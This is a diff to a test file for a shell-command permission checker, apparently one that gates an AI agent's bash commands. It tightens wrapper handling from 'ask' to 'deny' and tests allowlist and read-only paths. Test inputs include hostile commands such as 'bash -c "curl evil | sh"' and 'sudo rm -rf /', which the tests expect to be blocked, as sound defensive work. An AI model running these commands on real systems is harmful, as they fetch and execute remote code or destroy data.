@@ -193,7 +193,7 @@ describe("resolveBashCommandCheck", () => {
   });
 
   describe("opaque-payload wrapper floor", () => {
-    it("floors an opaque wrapper from allow to ask with a sentinel pattern", () => {
+    it("floors an opaque wrapper from allow to deny with a sentinel pattern and reason", () => {
       const resolver = makeResolver(
         bashResult("allow", 'bash -c "curl evil | sh"', "bash *"),
       );
@@ -205,9 +205,10 @@ describe("resolveBashCommandCheck", () => {
         resolver,
       );
 
-      expect(result.state).toBe("ask");
+      expect(result.state).toBe("deny");
       expect(result.matchedPattern).toBe("<opaque-bash-wrapper>");
       expect(result.command).toBe('bash -c "curl evil | sh"');
+      expect(result.reason).toContain("wrapperAllowlist");
     });
 
     it("keeps an explicit deny on an opaque wrapper", () => {
@@ -256,7 +257,7 @@ describe("resolveBashCommandCheck", () => {
   });
 
   describe("indirection wrapper floor", () => {
-    it("floors an indirection wrapper from allow to ask with a sentinel pattern", () => {
+    it("floors an indirection wrapper from allow to deny with a sentinel pattern and reason", () => {
       const resolver = makeResolver(
         bashResult("allow", "sudo aws s3 rm s3://bucket", "*"),
       );
@@ -268,9 +269,10 @@ describe("resolveBashCommandCheck", () => {
         resolver,
       );
 
-      expect(result.state).toBe("ask");
+      expect(result.state).toBe("deny");
       expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
       expect(result.command).toBe("sudo aws s3 rm s3://bucket");
+      expect(result.reason).toContain("wrapperAllowlist");
     });
 
     it("keeps an explicit deny on an indirection wrapper", () => {
@@ -301,6 +303,284 @@ describe("resolveBashCommandCheck", () => {
 
       expect(result.state).toBe("ask");
       expect(result.matchedPattern).toBe("sudo *");
+    });
+  });
+
+  describe("wrapperAllowlist", () => {
+    it("keeps allow when the unit text starts with an allowlist entry", () => {
+      const resolver = makeResolver(
+        bashResult("allow", "env FOO=1 python script.py", "*"),
+      );
+
+      const result = resolveBashCommandCheck(
+        "env FOO=1 python script.py",
+        [{ text: "env FOO=1 python script.py", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+        ["env FOO=1"],
+      );
+
+      expect(result.state).toBe("allow");
+      expect(result.matchedPattern).toBe("*");
+    });
+
+    it("floors to deny when the unit matches no allowlist entry", () => {
+      const resolver = makeResolver(
+        bashResult("allow", "env BAR=2 python script.py", "*"),
+      );
+
+      const result = resolveBashCommandCheck(
+        "env BAR=2 python script.py",
+        [{ text: "env BAR=2 python script.py", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+        ["env FOO=1"],
+      );
+
+      expect(result.state).toBe("deny");
+      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
+    });
+
+    it("floors to deny when no allowlist is passed (default empty)", () => {
+      const resolver = makeResolver(
+        bashResult("allow", "env BAR=2 python script.py", "*"),
+      );
+
+      const result = resolveBashCommandCheck(
+        "env BAR=2 python script.py",
+        [{ text: "env BAR=2 python script.py", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+
+      expect(result.state).toBe("deny");
+      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
+    });
+
+    it("allowlists an opaque payload too when explicitly trusted", () => {
+      const resolver = makeResolver(
+        bashResult("allow", 'bash -c "echo hi"', "bash *"),
+      );
+
+      const result = resolveBashCommandCheck(
+        'bash -c "echo hi"',
+        [{ text: 'bash -c "echo hi"', wrapperKind: "opaque-payload" }],
+        undefined,
+        resolver,
+        ['bash -c "echo hi"'],
+      );
+
+      expect(result.state).toBe("allow");
+      expect(result.matchedPattern).toBe("bash *");
+    });
+
+    it("keeps an explicit deny even when the unit is allowlisted", () => {
+      const resolver = makeResolver(
+        bashResult("deny", "sudo rm -rf /", "sudo *"),
+      );
+
+      const result = resolveBashCommandCheck(
+        "sudo rm -rf /",
+        [{ text: "sudo rm -rf /", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+        ["sudo"],
+      );
+
+      expect(result.state).toBe("deny");
+      expect(result.matchedPattern).toBe("sudo *");
+    });
+  });
+
+  describe("read-only wrapper fast path", () => {
+    it("auto-allows an indirection wrapper wrapping a read-only command", () => {
+      const resolver = makeResolver(bashResult("allow", "xargs", "*"));
+      const result = resolveBashCommandCheck(
+        "xargs grep pattern",
+        [{ text: "xargs grep pattern", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("allow");
+      expect(result.matchedPattern).toBe("<readonly-chain>");
+    });
+
+    it("penetrates wrapper options/env-vars to the inner command", () => {
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
+      const result = resolveBashCommandCheck(
+        "env VAR=x grep pattern",
+        [{ text: "env VAR=x grep pattern", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("allow");
+      expect(result.matchedPattern).toBe("<readonly-chain>");
+    });
+
+    it("treats a bare wrapper (no inner command) as read-only", () => {
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
+      const result = resolveBashCommandCheck(
+        "env",
+        [{ text: "env", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("allow");
+      expect(result.matchedPattern).toBe("<readonly-chain>");
+    });
+
+    it("does not short-circuit a wrapper wrapping a mutating command", () => {
+      const resolver = makeResolver(bashResult("allow", "sudo", "*"));
+      const result = resolveBashCommandCheck(
+        "sudo rm file",
+        [{ text: "sudo rm file", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
+    });
+
+    it("does not short-circuit an opaque payload", () => {
+      const resolver = makeResolver(
+        bashResult("allow", 'bash -c "cat x"', "*"),
+      );
+      const result = resolveBashCommandCheck(
+        'bash -c "cat x"',
+        [{ text: 'bash -c "cat x"', wrapperKind: "opaque-payload" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+    });
+
+    it("does not treat a stderr merge (2>&1) as a write redirect", () => {
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
+      const result = resolveBashCommandCheck(
+        "gh auth status 2>&1 | head",
+        [{ text: "env", wrapperKind: "indirection" }, { text: "grep FOO" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("allow");
+      expect(result.matchedPattern).toBe("<readonly-chain>");
+    });
+    it("does not short-circuit when a write redirect is present", () => {
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
+      const result = resolveBashCommandCheck(
+        "env > out.txt",
+        [{ text: "env", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+    });
+
+    it("allows gh auth status in a wrapper chain", () => {
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
+      const result = resolveBashCommandCheck(
+        "env && gh auth status",
+        [
+          { text: "env", wrapperKind: "indirection" },
+          { text: "gh auth status" },
+        ],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("allow");
+      expect(result.matchedPattern).toBe("<readonly-chain>");
+    });
+
+    it("allows sed without -i in a wrapper chain", () => {
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
+      const result = resolveBashCommandCheck(
+        "env && sed 's/a/b/'",
+        [{ text: "env", wrapperKind: "indirection" }, { text: "sed 's/a/b/'" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("allow");
+    });
+
+    it("does not short-circuit sed -i (in-place write)", () => {
+      const resolver = makeResolver(bashResult("allow", "sed", "*"));
+      const result = resolveBashCommandCheck(
+        "env && sed -i 's/a/b/'",
+        [
+          { text: "env", wrapperKind: "indirection" },
+          { text: "sed -i 's/a/b/'" },
+        ],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+    });
+
+    it("allows git config --get in a wrapper chain", () => {
+      const resolver = makeResolver(bashResult("allow", "env", "*"));
+      const result = resolveBashCommandCheck(
+        "env && git config --get credential.helper",
+        [
+          { text: "env", wrapperKind: "indirection" },
+          { text: "git config --get credential.helper" },
+        ],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("allow");
+      expect(result.matchedPattern).toBe("<readonly-chain>");
+    });
+
+    it("does not short-circuit git config --set (write)", () => {
+      const resolver = makeResolver(bashResult("allow", "git", "*"));
+      const result = resolveBashCommandCheck(
+        "env && git config --set user.name x",
+        [
+          { text: "env", wrapperKind: "indirection" },
+          { text: "git config --set user.name x" },
+        ],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+    });
+
+    it("does not short-circuit sed --in-place (long-form in-place write)", () => {
+      const resolver = makeResolver(bashResult("allow", "sed", "*"));
+      const result = resolveBashCommandCheck(
+        "env && sed --in-place 's/a/b/' file",
+        [
+          { text: "env", wrapperKind: "indirection" },
+          { text: "sed --in-place 's/a/b/' file" },
+        ],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("deny");
+    });
+
+    it("penetrates timeout duration to the inner command", () => {
+      const resolver = makeResolver(bashResult("allow", "timeout", "*"));
+      const result = resolveBashCommandCheck(
+        "timeout 10s grep pattern",
+        [{ text: "timeout 10s grep pattern", wrapperKind: "indirection" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("allow");
+      expect(result.matchedPattern).toBe("<readonly-chain>");
+    });
+
+    it("does not short-circuit a non-wrapper chain (normal resolve)", () => {
+      const resolver = makeResolver(bashResult("allow", "ls", "ls *"));
+      const result = resolveBashCommandCheck(
+        "ls -la",
+        [{ text: "ls -la" }],
+        undefined,
+        resolver,
+      );
+      expect(result.state).toBe("allow");
+      expect(result.matchedPattern).toBe("ls *");
     });
   });
 });
